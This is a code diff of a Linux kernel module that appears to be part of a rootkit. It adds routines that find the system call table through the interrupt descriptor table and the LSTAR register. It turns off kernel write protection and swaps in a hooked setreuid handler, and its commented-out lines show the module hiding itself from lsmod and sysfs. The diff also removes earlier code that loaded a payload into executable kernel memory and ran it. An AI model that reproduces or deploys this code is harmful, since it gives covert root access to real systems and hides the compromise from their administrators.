@@ -2,9 +2,10 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 
+#include <linux/cred.h>
 #include <linux/unistd.h>   // syscalls
 #include <linux/syscalls.h> // syscalls
-#include <linux/vmalloc.h>
+#include <linux/capability.h>
 
 #include <asm/paravirt.h>   // write_cr0
 
@@ -13,15 +14,22 @@
 #define SEARCH_START    PAGE_OFFSET
 #define SEARCH_END      ULONG_MAX //PAGE_OFFSET + 0xffffffff
 
-/* patched by r0bin.c:insmod() */
-unsigned long marker            = 0xdeadb33f;
-unsigned long kstart            = -1;
-unsigned long klen              = -1;
-unsigned long kenter            = -1;
-unsigned char *r0mem    = (void *)-1;
-int (*reloc)(unsigned char *, void (*pk)(char *, ...)) = (void *)-1;
+unsigned long *sct;
+unsigned long *ia32_sct;
 
-unsigned long *syscall_table;
+struct
+{
+    unsigned short limit;
+    unsigned long base;
+} __attribute__ ((packed))idtr;
+
+struct
+{
+    unsigned short off1;
+    unsigned short sel;
+    unsigned char none, flags;
+    unsigned short off2;
+} __attribute__ ((packed))idt;
 
 asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
 asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
@@ -39,18 +47,105 @@ asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
     return orig_setreuid(ruid, euid);
 }
 
-unsigned long *find_sys_call_table(void)
+void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
+{
+    char *p;
+
+    for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++)
+    {
+        if(memcmp(p, needle, needle_size) == 0)
+            return (void *)p;
+    }
+
+    return NULL;
+}
+
+#if defined(__i386__)
+// Phrack #58 0x07; sd, devik
+unsigned long *find_sct(void)
+{
+    char **p;
+    unsigned long sct_off = 0;
+    unsigned char code[255];
+
+    asm("sidt %0":"=m" (idtr));
+    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
+    sct_off = (idt.off2 << 16) | idt.off1;
+    memcpy(code, (void *)sct_off, sizeof(code));
+
+    p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);
+
+    if ( p )
+        return *(unsigned long **)((char *)p + 3);
+    else
+        return NULL;
+}
+#elif defined(__x86_64__)
+// http://bbs.chinaunix.net/thread-2143235-1-1.html
+unsigned long *find_sct(void)
+{
+    char **p;
+    unsigned long sct_off = 0;
+    unsigned char code[512];
+
+    rdmsrl(MSR_LSTAR, sct_off);
+    memcpy(code, (void *)sct_off, sizeof(code));
+
+    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
+
+    if ( p )
+    {
+        unsigned long *sct = *(unsigned long **)((char *)p + 3);
+
+        // Stupid compiler doesn't want to do bitwise math on pointers
+        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);
+
+        return sct;
+    }
+    else
+        return NULL;
+}
+
+// Obtain sys_call_table on amd64; pouik
+unsigned long *find_ia32_sct(void)
+{
+    char **p;
+    unsigned long sct_off = 0;
+    unsigned char code[512];
+
+    asm("sidt %0":"=m" (idtr));
+    memcpy(&idt, (void *)(idtr.base + 16 * 0x80), sizeof(idt));
+    sct_off = (idt.off2 << 16) | idt.off1;
+    memcpy(code, (void *)sct_off, sizeof(code));
+
+    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
+
+    if ( p )
+    {
+        unsigned long *sct = *(unsigned long **)((char *)p + 3);
+
+        // Stupid compiler doesn't want to do bitwise math on pointers
+        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);
+
+        return sct;
+    }
+    else
+        return NULL;
+}
+#endif
+
+unsigned long *locate_sct_by_addr_scan(void)
 {
     unsigned long i;
 
     for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
     {
-        unsigned long *sys_call_table = (unsigned long *)i;
+        unsigned long *sct = (unsigned long *)i;
 
-        if(sys_call_table[__NR_close] == (unsigned long)sys_close)
+        if(sct[__NR_close] == (unsigned long)sys_close)
         {
-            printk("sys_call_table found @ %lx\n", (unsigned long)sys_call_table);
-            return sys_call_table;
+            printk("sct found @ %lx\n", (unsigned long)sct);
+            return sct;
         }
     }
 
@@ -59,44 +154,41 @@ unsigned long *find_sys_call_table(void)
 
 static int __init r0mod_init(void)
 {
-    int i;
-    int (*kinit)(void);
-
     printk("Module starting...\n");
 
     //printk("Hiding module object.\n");
-    //list_del_init(&__this_module.list);
-    //kobject_del(&THIS_MODULE->mkobj.kobj);
+    //list_del_init(&__this_module.list);               // Remove from lsmod
+    //kobject_del(&THIS_MODULE->mkobj.kobj);            // Remove from FS?
+    //kobject_del(&THIS_MODULE->holders_dir->parent);   // Remove from FS?
 
     printk("Search Start: %lx\n", SEARCH_START);
     printk("Search End:   %lx\n", SEARCH_END);
 
-    if((syscall_table = (void *)find_sys_call_table()) == NULL)
-    {
-        printk("syscall_table == NULL\n");
-        return -1;
-    }
+#if defined(__x86_64__)
+    if((ia32_sct = (void *)find_ia32_sct()) == NULL)
+        printk("ia32_sct == NULL");
+#endif
 
-    printk("sys_call_table hooked @ %lx\n", (unsigned long)syscall_table);
+    if((sct = (void *)find_sct()) == NULL)
+        printk("sct == NULL\n");
+
+#if defined(__x86_64__)
+    if(sct == NULL && ia32_sct == NULL)
+#else
+    if(sct == NULL)
+#endif
+        return -1;
+
+    printk("sct hooked @ %lx\n", (unsigned long)sct);
 
     write_cr0(read_cr0() & (~0x10000));
 
-    orig_setreuid = (void *)syscall_table[__NR_setreuid];
-    syscall_table[__NR_setreuid] = (unsigned long)new_setreuid;
+    orig_setreuid = (void *)sct[__NR_setreuid];
+    sct[__NR_setreuid] = (unsigned long)new_setreuid;
 
     write_cr0(read_cr0() | 0x10000);
 
-    r0mem = __vmalloc(8192 * 3, GFP_KERNEL, PAGE_KERNEL_EXEC);
-    printk("r0mem: 0x%p\n", r0mem);
-
-    reloc(r0mem, (void*)&printk);
-    for(i = 0; i < klen; i++)
-        *(r0mem + i) = *(unsigned char *)(kstart + i);
-
-    kinit = (void *)(kenter - kstart);
-    kinit = (void *)r0mem + (unsigned long)kinit;
-
-    return kinit();
+    return 0;
 }
 
 
@@ -104,11 +196,11 @@ static void __exit r0mod_exit(void)
 {
     printk("Module ending...\n");
 
-    if(syscall_table != NULL)
+    if(sct != NULL)
     {
         write_cr0(read_cr0() & (~0x10000));
 
-        syscall_table[__NR_setreuid] = (unsigned long)orig_setreuid;
+        sct[__NR_setreuid] = (unsigned long)orig_setreuid;
 
         write_cr0(read_cr0() | 0x10000);
     }
